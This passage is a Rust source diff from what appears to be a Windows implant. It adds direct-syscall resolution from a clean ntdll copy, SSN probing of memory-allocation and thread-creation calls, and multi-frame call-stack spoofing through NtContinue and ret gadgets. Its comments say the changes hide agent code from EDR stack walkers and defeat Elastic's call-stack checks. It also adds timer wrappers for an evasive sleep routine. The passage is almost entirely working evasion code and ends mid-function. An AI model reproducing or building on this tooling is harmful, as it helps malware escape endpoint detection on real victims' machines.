@@ -12,6 +12,9 @@ use anyhow::anyhow;
 use std::arch::asm;
 
 #[cfg(windows)]
+use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
+
+#[cfg(windows)]
 use std::sync::{Mutex, OnceLock};
 
 #[cfg(windows)]
@@ -20,14 +23,46 @@ use std::collections::HashMap;
 #[cfg(windows)]
 static CLEAN_NTDLL: OnceLock<usize> = OnceLock::new();
 
+/// Per-call SSN cache: function name → (ssn, gadget_addr, pe_timestamp).
+/// The third element is the `TimeDateStamp` from the PE header of the clean
+/// ntdll at the time the entry was cached — used for cross-reference validation.
 #[cfg(windows)]
-static SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, (u32, usize)>>> = OnceLock::new();
+static SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, (u32, usize, u32)>>> = OnceLock::new();
+
+/// Cached Windows build number.  0 = not yet queried.
+#[cfg(windows)]
+static BUILD_NUMBER: AtomicU32 = AtomicU32::new(0);
+
+/// Cached `TimeDateStamp` from the PE header of the clean-mapped ntdll.
+#[cfg(windows)]
+static CACHED_TIMESTAMP: AtomicU32 = AtomicU32::new(0);
+
+/// Whether the cache has been invalidated and needs re-mapping on next access.
+#[cfg(windows)]
+static CACHE_DIRTY: AtomicBool = AtomicBool::new(false);
+
+/// NTSTATUS codes for probe validation.
+#[cfg(windows)]
+const STATUS_INVALID_HANDLE: i32 = 0xC0000008_u32 as i32;
+#[cfg(windows)]
+const STATUS_INVALID_SYSTEM_SERVICE: i32 = 0xC000001C_u32 as i32;
+
+/// `KUSER_SHARED_DATA` is always mapped at `0x7FFE0000`.
+#[cfg(windows)]
+const KUSER_SHARED_DATA: usize = 0x7FFE0000;
+#[cfg(windows)]
+const KUSD_OFFSET_BUILD: usize = 0x0260;
 
 /// Cached address of a `ret` (0xC3) byte within `ntdll!NtQuerySystemTime`.
-/// When the `stack-spoof` feature is active, this address is pushed onto the
-/// user-mode stack immediately before the syscall gadget is entered.  EDR
-/// kernel callbacks that walk the call stack then see ntdll as the immediate
-/// caller of the syscall stub instead of agent memory.
+///
+/// **Legacy fallback**: When the `stack-spoof` feature is active and the
+/// unwind-aware `stack_db` module cannot resolve a multi-frame chain, this
+/// single address is used as a one-frame spoof — identical to the original
+/// behaviour.  The preferred path is `stack_db::build_chain()` which provides
+/// multi-frame plausible call graph chains.
+///
+/// EDR kernel callbacks that walk the call stack then see ntdll as the
+/// immediate caller of the syscall stub instead of agent memory.
 #[cfg(all(windows, feature = "stack-spoof"))]
 static NTDLL_SPOOF_FRAME: OnceLock<usize> = OnceLock::new();
 
@@ -647,13 +682,26 @@ fn read_export_dir(base: usize, func_name: &str) -> Result<SyscallTarget> {
 #[cfg(windows)]
 pub fn get_syscall_id(func_name: &str) -> Result<SyscallTarget> {
     let cache_lock = SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
-    if let Some(&(ssn, gadget_addr)) = cache_lock.lock().unwrap().get(func_name) {
+
+    // Fast path: check cache.
+    if let Some(&(ssn, gadget_addr, _ts)) = cache_lock.lock().unwrap().get(func_name) {
         return Ok(SyscallTarget { ssn, gadget_addr });
     }
 
     let base = *CLEAN_NTDLL.get_or_init(|| {
         match map_clean_ntdll() {
-            Ok(b) => b,
+            Ok(b) => {
+                // Capture the PE timestamp for cross-reference validation.
+                let ts = unsafe { read_pe_timestamp(b) };
+                CACHED_TIMESTAMP.store(ts, Ordering::Release);
+                // Also cache the build number.
+                let _ = get_build_number();
+                log::debug!(
+                    "syscalls: clean ntdll mapped at {:#x} (timestamp={:#010x}, build={})",
+                    b, ts, BUILD_NUMBER.load(Ordering::Acquire)
+                );
+                b
+            }
             Err(e) => {
                 // Do NOT call process::exit — a hooked or unavailable stub
                 // should degrade gracefully.  Callers already use `?` so the
@@ -673,11 +721,226 @@ pub fn get_syscall_id(func_name: &str) -> Result<SyscallTarget> {
     }
 
     let target = read_export_dir(base, func_name)?;
+
+    // Validate against versioned SSN range table.
+    let build = get_build_number();
+    if build != 0 {
+        if let Some((lo, hi)) = expected_ssn_range(func_name, build) {
+            if target.ssn < lo || target.ssn > hi {
+                log::warn!(
+                    "syscalls: resolved {} SSN={} outside expected range [{},{}] for build {}",
+                    func_name, target.ssn, lo, hi, build
+                );
+            }
+        }
+    }
+
     cache_lock
         .lock()
         .unwrap()
-        .insert(func_name.to_string(), (target.ssn, target.gadget_addr));
+        .insert(
+            func_name.to_string(),
+            (target.ssn, target.gadget_addr, CACHED_TIMESTAMP.load(Ordering::Acquire)),
+        );
     Ok(target)
+}
+
+// ── Dynamic SSN validation API ─────────────────────────────────────────────
+
+/// Invalidate the SSN cache and mark the clean ntdll mapping as stale.
+///
+/// Called by `ntdll_unhook` after re-fetching ntdll, so the next
+/// `get_syscall_id` call re-maps from the now-fresh on-disk ntdll.
+#[cfg(windows)]
+pub fn invalidate_syscall_cache() {
+    CACHE_DIRTY.store(true, Ordering::Release);
+    if let Some(cache) = SYSCALL_CACHE.get() {
+        cache.lock().unwrap().clear();
+    }
+    CACHED_TIMESTAMP.store(0, Ordering::Release);
+    log::debug!("syscalls: cache invalidated — re-map on next access");
+}
+
+/// Return the current Windows build number (e.g. 19041, 22631).
+///
+/// Reads from `KUSER_SHARED_DATA` which is always mapped at `0x7FFE0000`.
+/// The value is cached after the first read.
+#[cfg(windows)]
+pub fn get_build_number() -> u32 {
+    let cached = BUILD_NUMBER.load(Ordering::Acquire);
+    if cached != 0 {
+        return cached;
+    }
+
+    let build = unsafe {
+        let ptr = (KUSER_SHARED_DATA + KUSD_OFFSET_BUILD) as *const u32;
+        let raw = ptr.read_volatile();
+        raw & 0x0000_FFFF
+    };
+
+    BUILD_NUMBER.store(build, Ordering::Release);
+    log::debug!("syscalls: Windows build number = {}", build);
+    build
+}
+
+/// Validate the current SSN cache.  Returns the number of validated entries
+/// on success, or an error if validation failed and re-mapping is needed.
+///
+/// Two validation methods:
+/// 1. **Cross-reference**: Compare PE `TimeDateStamp` of loaded vs cached ntdll.
+/// 2. **Probe**: Test critical syscalls with invalid params to verify SSN.
+#[cfg(windows)]
+pub fn validate_cache() -> Result<usize> {
+    // If cache was explicitly invalidated, force re-map.
+    if CACHE_DIRTY.load(Ordering::Acquire) {
+        return Err(anyhow!("syscalls: cache dirty — needs re-map"));
+    }
+
+    // ── Cross-reference via PE timestamp ────────────────────────────────
+    let cached_ts = CACHED_TIMESTAMP.load(Ordering::Acquire);
+    if cached_ts != 0 {
+        let loaded_ts = unsafe { read_ntdll_timestamp() };
+        if loaded_ts != 0 && loaded_ts != cached_ts {
+            log::warn!(
+                "syscalls: timestamp mismatch — loaded={:#010x} cached={:#010x}",
+                loaded_ts, cached_ts
+            );
+            invalidate_syscall_cache();
+            return Err(anyhow!("syscalls: ntdll timestamp changed — cache invalidated"));
+        }
+    }
+
+    // ── Probe critical syscalls ─────────────────────────────────────────
+    let cache = SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
+    let cache_lock = cache.lock().unwrap();
+    let mut validated = 0;
+    let mut any_stale = false;
+
+    for name in CRITICAL_PROBE_SYSCALLS {
+        if let Some(&(ssn, gadget, _ts)) = cache_lock.get(*name) {
+            match probe_ssn(ssn, gadget) {
+                ProbeResult::Valid => validated += 1,
+                ProbeResult::Stale => {
+                    log::warn!("syscalls: probe detected stale SSN for {}", name);
+                    any_stale = true;
+                }
+                ProbeResult::Unknown => validated += 1,
+            }
+        }
+    }
+
+    // Count non-critical entries.
+    validated += cache_lock
+        .keys()
+        .filter(|k| !CRITICAL_PROBE_SYSCALLS.contains(&k.as_str()))
+        .count();
+
+    if any_stale {
+        drop(cache_lock);
+        invalidate_syscall_cache();
+        return Err(anyhow!("syscalls: stale SSNs detected by probe"));
+    }
+
+    // Validate against build-number range table.
+    let build = get_build_number();
+    if build != 0 {
+        for (name, &(ssn, _gadget, _ts)) in cache_lock.iter() {
+            if let Some((lo, hi)) = expected_ssn_range(name, build) {
+                if ssn < lo || ssn > hi {
+                    log::warn!(
+                        "syscalls: {} SSN={} outside range [{},{}] for build {}",
+                        name, ssn, lo, hi, build
+                    );
+                }
+            }
+        }
+    }
+
+    log::debug!("syscalls: cache validated — {} entries OK", validated);
+    Ok(validated)
+}
+
+/// Syscalls that get probe-validated.
+#[cfg(windows)]
+const CRITICAL_PROBE_SYSCALLS: &[&str] = &[
+    "NtAllocateVirtualMemory",
+    "NtProtectVirtualMemory",
+    "NtWriteVirtualMemory",
+    "NtCreateThreadEx",
+];
+
+/// Result of an SSN probe call.
+#[cfg(windows)]
+enum ProbeResult {
+    Valid,
+    Stale,
+    Unknown,
+}
+
+/// Probe an SSN by calling it with a NULL handle.
+#[cfg(windows)]
+fn probe_ssn(ssn: u32, gadget_addr: usize) -> ProbeResult {
+    let status = unsafe {
+        do_syscall(ssn, gadget_addr, &[0u64, 0, 0, 0, 0, 0])
+    };
+    if status == STATUS_INVALID_HANDLE {
+        ProbeResult::Valid
+    } else if status == STATUS_INVALID_SYSTEM_SERVICE {
+        ProbeResult::Stale
+    } else {
+        ProbeResult::Unknown
+    }
+}
+
+/// Read the `TimeDateStamp` from the PE header of the loaded ntdll.
+#[cfg(windows)]
+unsafe fn read_ntdll_timestamp() -> u32 {
+    let base = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
+        Some(b) => b,
+        None => return 0,
+    };
+    read_pe_timestamp(base)
+}
+
+/// Read the `TimeDateStamp` from the PE header at `base`.
+#[cfg(windows)]
+unsafe fn read_pe_timestamp(base: usize) -> u32 {
+    let dos = &*(base as *const winapi::um::winnt::IMAGE_DOS_HEADER);
+    if dos.e_magic != 0x5A4D {
+        return 0;
+    }
+    let nt = &*((base + dos.e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64);
+    nt.FileHeader.TimeDateStamp
+}
+
+/// Return the expected SSN range for `func_name` on the given build.
+#[cfg(windows)]
+fn expected_ssn_range(func_name: &str, _build: u32) -> Option<(u32, u32)> {
+    let ranges: &[(&str, u32, u32)] = &[
+        ("NtAllocateVirtualMemory",    0x0010, 0x0028),
+        ("NtProtectVirtualMemory",     0x0030, 0x0058),
+        ("NtWriteVirtualMemory",       0x0028, 0x0040),
+        ("NtReadVirtualMemory",        0x0028, 0x0042),
+        ("NtCreateThreadEx",           0x0038, 0x0060),
+        ("NtOpenProcess",              0x0020, 0x0038),
+        ("NtOpenThread",               0x0020, 0x0036),
+        ("NtClose",                    0x0002, 0x0010),
+        ("NtQueryVirtualMemory",       0x0018, 0x0030),
+        ("NtQuerySystemInformation",   0x0028, 0x0044),
+        ("NtMapViewOfSection",         0x0018, 0x0028),
+        ("NtUnmapViewOfSection",       0x0018, 0x002A),
+        ("NtCreateSection",            0x0038, 0x0052),
+        ("NtOpenFile",                 0x0020, 0x0038),
+        ("NtReadFile",                 0x0002, 0x000C),
+        ("NtSetInformationProcess",    0x0028, 0x0040),
+        ("NtFreeVirtualMemory",        0x0010, 0x0028),
+        ("NtQueueApcThread",           0x0038, 0x0056),
+        ("NtSetContextThread",         0x0038, 0x0056),
+        ("NtGetContextThread",         0x0038, 0x0056),
+    ];
+    ranges.iter().find_map(|&(name, lo, hi)| {
+        if name == func_name { Some((lo, hi)) } else { None }
+    })
 }
 
 #[cfg(windows)]
@@ -850,9 +1113,48 @@ pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
         // When the feature is disabled or the gadget is unavailable, the value
         // is 0 and the `jz 44f` branch inside the asm falls back to the plain
         // `call r11` path with no additional overhead beyond a single test+jz.
+        //
+        // ── Unwind-aware multi-frame chains ─────────────────────────────────
+        // The `stack_db` module maintains a database of valid return addresses
+        // from loaded-module export tables, verified against RUNTIME_FUNCTION
+        // entries via RtlLookupFunctionEntry.  At each do_syscall invocation
+        // we try to build a multi-frame chain (e.g. kernelbase!CreateProcessW
+        // → kernel32!CreateProcessA → ntdll!NtCreateUserProcess) that presents
+        // a plausible call graph to EDR stack walkers.  If the database is
+        // empty or no template resolves, we fall back to the legacy single-
+        // frame NtQuerySystemTime spoof.
         #[cfg(feature = "stack-spoof")]
-        let spoof_frame: usize =
+        let legacy_spoof_frame: usize =
             *NTDLL_SPOOF_FRAME.get_or_init(|| find_ntdll_spoof_frame());
+
+        // Try the unwind-aware multi-frame chain first; fall back to legacy.
+        #[cfg(feature = "stack-spoof")]
+        let chain: Option<crate::stack_db::ResolvedChain> = crate::stack_db::build_chain()
+            .or_else(|| {
+                // Legacy fallback: single-frame NtQuerySystemTime spoof.
+                if legacy_spoof_frame != 0 {
+                    Some(crate::stack_db::ResolvedChain {
+                        frames: vec![crate::stack_db::ChainFrame {
+                            return_addr: legacy_spoof_frame,
+                        }],
+                    })
+                } else {
+                    None
+                }
+            });
+
+        #[cfg(not(feature = "stack-spoof"))]
+        let chain: Option<crate::stack_db::ResolvedChain> = None;
+
+        // Determine the effective "top of chain" spoof frame for the jmp-based
+        // path.  This is the first (bottom) frame of the chain — the one the
+        // gadget's `ret` will jump to.
+        #[cfg(feature = "stack-spoof")]
+        let spoof_frame: usize = chain
+            .as_ref()
+            .and_then(|c| c.frames.first())
+            .map(|f| f.return_addr)
+            .unwrap_or(0);
         #[cfg(not(feature = "stack-spoof"))]
         let spoof_frame: usize = 0;
 
@@ -874,139 +1176,158 @@ pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
         //   Instead of manipulating the stack in user mode and jumping to the
         //   gadget, we build a CONTEXT record that describes where execution
         //   should resume (Rip = syscall gadget, all argument registers set,
-        //   Rsp pointing to a stack that has [spoof_frame, continuation] on
-        //   top) and call NtContinue via a direct `syscall` instruction.
+        //   Rsp pointing to a stack that has the chain frames + continuation
+        //   on top) and call NtContinue via a direct `syscall` instruction.
         //   The kernel itself then performs the context switch.  Any trap frame
         //   the kernel constructs during APC delivery or exception dispatch
         //   between our `syscall` (for NtContinue) and the eventual `syscall`
-        //   instruction at the gadget will show Rsp→spoof_frame (ntdll) as the
+        //   instruction at the gadget will show Rsp→chain[0] (ntdll) as the
         //   user-mode return address — agent code never appears in any
         //   kernel-visible frame.
+        //
+        // Multi-frame chain layout:
+        //   The spoofed stack contains N chain frames (ret gadgets in loaded
+        //   DLL functions), followed by the continuation address and shadow
+        //   space.  Each chain frame is a `ret` instruction inside a real
+        //   function (e.g. ntdll!NtCreateUserProcess+0x1A).  After the gadget
+        //   `ret`s, execution walks through each chain frame's `ret` in turn,
+        //   eventually reaching our continuation.
+        //
+        //   EDR stack walkers see:
+        //     ntdll!NtCreateUserProcess+0x1A    ← immediate return site
+        //     kernel32!CreateProcessA+0x3C       ← one level up
+        //     kernelbase!CreateProcessW+0x55     ← two levels up
+        //
+        //   This presents a plausible call graph that terminates at a real
+        //   NT syscall stub, defeating Elastic's call-stack consistency checks.
         //
         // The NtContinue call itself is made via a bare `syscall` instruction
         // in inline asm (no further stack manipulation) so there is no
         // recursive spoof nesting.
         #[cfg(all(feature = "stack-spoof", target_arch = "x86_64"))]
-        if spoof_frame != 0 {
-            use winapi::um::winnt::{CONTEXT, CONTEXT_INTEGER, CONTEXT_CONTROL};
+        if let Some(ref resolved_chain) = chain {
+            if !resolved_chain.frames.is_empty() {
+                use winapi::um::winnt::{CONTEXT, CONTEXT_INTEGER, CONTEXT_CONTROL};
 
-            let ntcontinue_ssn: u32 =
-                *NTCONTINUE_SSN.get_or_init(|| resolve_ntcontinue_ssn());
+                let ntcontinue_ssn: u32 =
+                    *NTCONTINUE_SSN.get_or_init(|| resolve_ntcontinue_ssn());
 
-            if ntcontinue_ssn != 0 {
-                // ── Spoofed call stack layout for the target syscall ─────────
-                //
-                // When the kernel restores our CONTEXT and resumes at the
-                // `syscall; ret` gadget, ctx.Rsp must satisfy:
-                //
-                //   [Rsp + 0x00]  return address  ← spoof_frame (ntdll ret gadget)
-                //   [Rsp + 0x08]  shadow home rcx  ← continuation (popped by spoof_frame ret)
-                //   [Rsp + 0x10]  shadow home rdx  (zeroed; never read by kernel for syscalls)
-                //   [Rsp + 0x18]  shadow home r8   (zeroed; never read by kernel for syscalls)
-                //   [Rsp + 0x20]  shadow home r9   (zeroed; never read by kernel for syscalls)
-                //   [Rsp + 0x28]  arg 5            (if nstack >= 1)
-                //   [Rsp + 0x30]  arg 6            ...
-                //
-                // Execution trace:
-                //   NtContinue restores ctx → CPU executes `syscall` at gadget
-                //   → kernel handles target syscall
-                //   → gadget `ret` pops [Rsp+0x00] = spoof_frame  (rsp += 8)
-                //   → spoof_frame `ret` pops [new_rsp] = continuation (rsp += 8)
-                //   → resumes at label 2: with RAX = target syscall NTSTATUS
-                //
-                // Why shadow[0] (Rsp+0x08) can hold continuation:
-                //   Shadow slots are pre-allocated by the *caller* for the
-                //   callee to optionally spill register args.  The NT kernel's
-                //   syscall dispatch path never reads them for dispatching.
-                //   Re-using shadow[0] for the continuation avoids adding any
-                //   extra slots and keeps the 5th-arg offset at [Rsp+0x28].
-                //
-                // Layout (Vec indices):
-                //   [0]           = spoof_frame
-                //   [1]           = continuation  (shadow[0] slot — filled from asm)
-                //   [2..4]        = shadow[1..3]  (zeroed)
-                //   [5..5+nstack] = stack args    (args[4..])
-                let frame_elems = 5 + nstack;
-                let mut spoof_frame_buf: Vec<u64> = vec![0u64; frame_elems];
-                spoof_frame_buf[0] = spoof_frame as u64;
-                // [1] = continuation — filled from asm below.
-                // [2..4] remain zero (shadow[1..3]).
-                for i in 0..nstack {
-                    spoof_frame_buf[5 + i] = unsafe { *stack_ptr.add(i) };
-                }
-                let cont_slot_ptr: *mut u64 = &mut spoof_frame_buf[1];
+                if ntcontinue_ssn != 0 {
+                    let n_frames = resolved_chain.frames.len();
 
-                // Build the CONTEXT (zero-init).  CONTEXT_INTEGER | CONTEXT_CONTROL
-                // is sufficient for NtContinue to restore all integer registers and
-                // control-flow state without touching floating-point state.
-                //
-                // CONTEXT must be 16-byte aligned (Windows ABI requirement).
-                // winapi's CONTEXT lacks #[repr(align(16))]; we over-allocate
-                // by 15 bytes and align the pointer manually.
-                let ctx_size = std::mem::size_of::<CONTEXT>();
-                let mut ctx_storage: Vec<u8> = vec![0u8; ctx_size + 15];
-                let ctx_ptr_raw = ctx_storage.as_mut_ptr() as usize;
-                let ctx_ptr_aligned = (ctx_ptr_raw + 15) & !15usize;
-                let ctx: &mut CONTEXT =
-                    unsafe { &mut *(ctx_ptr_aligned as *mut CONTEXT) };
-
-                ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
-                ctx.Rax = ssn as u64;
-                ctx.Rcx = a1;
-                ctx.Rdx = a2;
-                ctx.R8  = a3;
-                ctx.R9  = a4;
-                ctx.R10 = a1;  // NT syscall ABI: R10 = RCX at entry
-                ctx.Rip = gadget_addr as u64;
-                // Rsp → spoof_frame_buf[0]; gadget `ret` pops buf[0]=spoof_frame,
-                // then spoof_frame `ret` pops buf[1]=continuation.
-                ctx.Rsp = spoof_frame_buf.as_ptr() as u64;
-
-                // ── Dispatch via a bare `syscall` for NtContinue ─────────────
-                // No stack manipulation here.  The kernel restores our CONTEXT;
-                // any trap frame it constructs before the target `syscall`
-                // executes will show ctx.Rsp→spoof_frame (ntdll) as the
-                // user-mode return site — agent code never appears.
-                let nt_status: i32;
-                // Ensure all prior writes to the stack argument area
-                // (spoof_frame_buf) and the CONTEXT structure are visible
-                // before the asm! block dispatches the NtContinue syscall.
-                // Without this fence the compiler could, in principle,
-                // reorder the raw-pointer stores past the asm! boundary.
-                std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
-                unsafe {
-                    asm!(
-                        // Fill in the continuation address at spoof_frame_buf[1].
-                        "lea r15, [rip + 2f]",
-                        "mov [{cont_slot}], r15",
-                        // NtContinue arguments (Windows x64 syscall ABI):
-                        //   RCX / R10 = PCONTEXT
-                        //   RDX       = TestAlert (FALSE = 0)
-                        //   EAX       = SSN
-                        "mov rcx, {ctx_ptr}",
-                        "xor rdx, rdx",
-                        "mov r10, rcx",
-                        "mov eax, {ntc_ssn:e}",
-                        // Direct syscall — no fake frames, no jmp.
-                        "syscall",
-                        // ── Continuation ──────────────────────────────────────
-                        // Reached after: gadget ret → spoof_frame ret → here.
-                        // RAX holds the NTSTATUS from the target syscall.
-                        "2:",
-                        ctx_ptr   = in(reg) ctx_ptr_aligned as u64,
-                        cont_slot = in(reg) cont_slot_ptr as u64,
-                        ntc_ssn   = in(reg) ntcontinue_ssn,
-                        lateout("rax") nt_status,
-                        out("rcx") _, out("rdx") _, out("r10") _, out("r11") _,
-                        out("r15") _,
+                    // ── Spoofed call stack layout (multi-frame) ───────────────
+                    //
+                    // When the kernel restores our CONTEXT and resumes at the
+                    // `syscall; ret` gadget, ctx.Rsp must satisfy:
+                    //
+                    //   [Rsp + 0x00 .. Rsp + (N-1)*8]  chain frame ret gadgets
+                    //   [Rsp + N*8]                     continuation
+                    //   [Rsp + (N+1)*8 .. (N+3)*8]      shadow home [1..3]
+                    //   [Rsp + (N+4)*8 .. ]              stack args
+                    //
+                    // Execution trace:
+                    //   NtContinue restores ctx → CPU executes `syscall` at gadget
+                    //   → kernel handles target syscall
+                    //   → gadget `ret` pops [Rsp+0] = chain_frame[0]  (rsp += 8)
+                    //   → chain_frame[0] `ret` pops [new_rsp] = chain_frame[1]
+                    //   → ... repeat for each chain frame ...
+                    //   → chain_frame[N-1] `ret` pops continuation
+                    //   → resumes at label 2: with RAX = target syscall NTSTATUS
+                    //
+                    // Layout (Vec indices):
+                    //   [0 .. N-1]           = chain frame ret gadgets
+                    //   [N]                  = continuation  (filled from asm)
+                    //   [N+1 .. N+3]        = shadow[1..3]  (zeroed)
+                    //   [N+4 .. N+4+nstack] = stack args    (args[4..])
+                    let frame_elems = crate::stack_db::frame_buffer_slots(n_frames, nstack);
+                    let mut spoof_frame_buf: Vec<u64> = vec![0u64; frame_elems];
+                    let cont_idx = crate::stack_db::populate_frame_buffer(
+                        &mut spoof_frame_buf,
+                        resolved_chain,
+                        // SAFETY: reading stack args via raw pointer; they were
+                        // set up from the `args` slice at the top of do_syscall.
+                        unsafe {
+                            std::slice::from_raw_parts(stack_ptr, nstack)
+                        },
                     );
+                    let cont_slot_ptr: *mut u64 = &mut spoof_frame_buf[cont_idx];
+
+                    // Build the CONTEXT (zero-init).  CONTEXT_INTEGER | CONTEXT_CONTROL
+                    // is sufficient for NtContinue to restore all integer registers and
+                    // control-flow state without touching floating-point state.
+                    //
+                    // CONTEXT must be 16-byte aligned (Windows ABI requirement).
+                    // winapi's CONTEXT lacks #[repr(align(16))]; we over-allocate
+                    // by 15 bytes and align the pointer manually.
+                    let ctx_size = std::mem::size_of::<CONTEXT>();
+                    let mut ctx_storage: Vec<u8> = vec![0u8; ctx_size + 15];
+                    let ctx_ptr_raw = ctx_storage.as_mut_ptr() as usize;
+                    let ctx_ptr_aligned = (ctx_ptr_raw + 15) & !15usize;
+                    let ctx: &mut CONTEXT =
+                        unsafe { &mut *(ctx_ptr_aligned as *mut CONTEXT) };
+
+                    ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
+                    ctx.Rax = ssn as u64;
+                    ctx.Rcx = a1;
+                    ctx.Rdx = a2;
+                    ctx.R8  = a3;
+                    ctx.R9  = a4;
+                    ctx.R10 = a1;  // NT syscall ABI: R10 = RCX at entry
+                    ctx.Rip = gadget_addr as u64;
+                    // Rsp → spoof_frame_buf[0]; gadget `ret` pops buf[0]=chain[0],
+                    // then chain[0] `ret` pops buf[1]=chain[1], etc., until
+                    // chain[N-1] `ret` pops buf[N]=continuation.
+                    ctx.Rsp = spoof_frame_buf.as_ptr() as u64;
+
+                    // ── Dispatch via a bare `syscall` for NtContinue ─────────
+                    // No stack manipulation here.  The kernel restores our CONTEXT;
+                    // any trap frame it constructs before the target `syscall`
+                    // executes will show ctx.Rsp→chain[0] (ntdll ret gadget)
+                    // as the user-mode return site — agent code never appears.
+                    let nt_status: i32;
+                    // Ensure all prior writes to the stack argument area
+                    // (spoof_frame_buf) and the CONTEXT structure are visible
+                    // before the asm! block dispatches the NtContinue syscall.
+                    std::sync::atomic::compiler_fence(
+                        std::sync::atomic::Ordering::SeqCst,
+                    );
+                    unsafe {
+                        asm!(
+                            // Fill in the continuation address at
+                            // spoof_frame_buf[cont_idx].
+                            "lea r15, [rip + 2f]",
+                            "mov [{cont_slot}], r15",
+                            // NtContinue arguments (Windows x64 syscall ABI):
+                            //   RCX / R10 = PCONTEXT
+                            //   RDX       = TestAlert (FALSE = 0)
+                            //   EAX       = SSN
+                            "mov rcx, {ctx_ptr}",
+                            "xor rdx, rdx",
+                            "mov r10, rcx",
+                            "mov eax, {ntc_ssn:e}",
+                            // Direct syscall — no fake frames, no jmp.
+                            "syscall",
+                            // ── Continuation ──────────────────────────────
+                            // Reached after: gadget ret → chain[0..N-1]
+                            // rets → continuation → here.
+                            // RAX holds the NTSTATUS from the target syscall.
+                            "2:",
+                            ctx_ptr   = in(reg) ctx_ptr_aligned as u64,
+                            cont_slot = in(reg) cont_slot_ptr as u64,
+                            ntc_ssn   = in(reg) ntcontinue_ssn,
+                            lateout("rax") nt_status,
+                            out("rcx") _, out("rdx") _, out("r10") _, out("r11") _,
+                            out("r15") _,
+                        );
+                    }
+                    // Keep buffers live until here.
+                    let _ = &spoof_frame_buf;
+                    let _ = &ctx_storage;
+                    return nt_status;
                 }
-                // Keep buffers live until here.
-                let _ = &spoof_frame_buf;
-                let _ = &ctx_storage;
-                return nt_status;
+                // NtContinue SSN unavailable — fall through to jmp-based spoof.
             }
-            // NtContinue SSN unavailable — fall through to jmp-based spoof below.
+            // Chain was empty (no frames) — fall through to jmp-based spoof.
         }
         // ─────────────────────────────────────────────────────────────────────
 
@@ -1053,6 +1374,7 @@ pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             // All three are consumed by rep movsq; a1/a2 are in separate registers
             // and cannot be touched by this loop (see SAFETY comment above).
             "test rcx, rcx",
+
             "jz 4f",
             "lea rdi, [rsp + 0x20]",
             "cld",
@@ -1067,25 +1389,30 @@ pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             "mov eax, {ssn:e}",
             "mov r11, {gadget}",
             // ── Call-stack spoofing (feature = "stack-spoof") ─────────────────
-            // When `spoof_frame` is non-zero (a valid `ret` inside ntdll was
-            // found), build a two-entry fake frame chain before jumping to the
+            // When `spoof_frame` is non-zero (a valid `ret` inside a loaded
+            // module was found — typically from the unwind-aware chain's first
+            // frame), build a two-entry fake frame chain before jumping to the
             // syscall gadget:
             //
-            //   [rsp+0]:  spoof_frame  — `ret` inside ntdll!NtQuerySystemTime
+            //   [rsp+0]:  spoof_frame  — `ret` inside a loaded-module function
             //   [rsp+8]:  label 43     — our real continuation in do_syscall
             //
             // Execution flow:
             //   jmp r11 → syscall_gadget (syscall; ret)
-            //           → spoof_frame (0xC3 ret inside ntdll)
+            //           → spoof_frame (0xC3 ret inside module)
             //           → label 43 (real continuation)
+            //
+            // NOTE: This jmp-based path only pushes a single spoof frame.
+            // The full multi-frame chain is used in the NtContinue path above.
+            // This path is the fallback when NtContinue's SSN is unavailable.
             //
             // EDR kernel callbacks walking the user-mode stack during the
             // kernel transition see the chain:
-            //   ntdll!NtQuerySystemTime+N  ← immediate return site (spoofed)
+            //   module!Func+N  ← immediate return site (spoofed)
             //   do_syscall (label 43)       ← one further level
             //
-            // This keeps the topmost visible frame entirely within ntdll,
-            // eliminating the "call from unbacked memory" indicator.
+            // This keeps the topmost visible frame entirely within a loaded
+            // module, eliminating the "call from unbacked memory" indicator.
             //
             // When `spoof_frame` == 0 (feature off or gadget unavailable),
             // `jz 44f` falls through to the plain `call r11` path so the
@@ -1095,7 +1422,7 @@ pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             // Spoofed path: push fake call chain, then jump to syscall gadget.
             "lea r15, [rip + 43f]",    // r15 = address of label 43 (real continuation)
             "push r15",                 // [rsp]   = real continuation  (popped by ntdll ret)
-            "mov r15, {spoof_frame}",  // r15 = NtQuerySystemTime ret-gadget address
+            "mov r15, {spoof_frame}",  // r15 = ret-gadget address from chain
             "push r15",                 // [rsp]   = spoof_frame         (popped by gadget ret)
             "jmp r11",                  // → syscall_gadget; ret → spoof_frame; ret → 43:
             "43:",
@@ -3115,6 +3442,97 @@ pub unsafe fn syscall_NtProtectVirtualMemory(
         ),
         Err(e) => {
             log::warn!("syscall_NtProtectVirtualMemory: could not get SSN: {}", e);
+            -1
+        }
+    }
+}
+
+/// Wrapper around NtCreateTimer used by the Cronus sleep variant.
+/// Signature: NtCreateTimer(TimerHandle, DesiredAccess, ObjectAttributes, TimerType)
+/// TimerType: 0 = NotificationTimer, 1 = SynchronizationTimer
+#[cfg(windows)]
+pub unsafe fn syscall_NtCreateTimer(
+    timer_handle: u64,   // *mut HANDLE
+    desired_access: u64, // ACCESS_MASK
+    object_attributes: u64, // POBJECT_ATTRIBUTES (0 for unnamed)
+    timer_type: u64,     // TIMER_TYPE (0 = Notification)
+) -> i32 {
+    match get_syscall_id("NtCreateTimer") {
+        Ok(target) => do_syscall(
+            target.ssn,
+            target.gadget_addr,
+            &[timer_handle, desired_access, object_attributes, timer_type],
+        ),
+        Err(e) => {
+            log::warn!("syscall_NtCreateTimer: could not get SSN: {}", e);
+            -1
+        }
+    }
+}
+
+/// Wrapper around NtSetTimer used by the Cronus sleep variant.
+/// Signature: NtSetTimer(TimerHandle, DueTime, TimerApcRoutine, TimerContext,
+///                        ResumeTimer, Period, PreviousState)
+#[cfg(windows)]
+pub unsafe fn syscall_NtSetTimer(
+    timer_handle: u64,
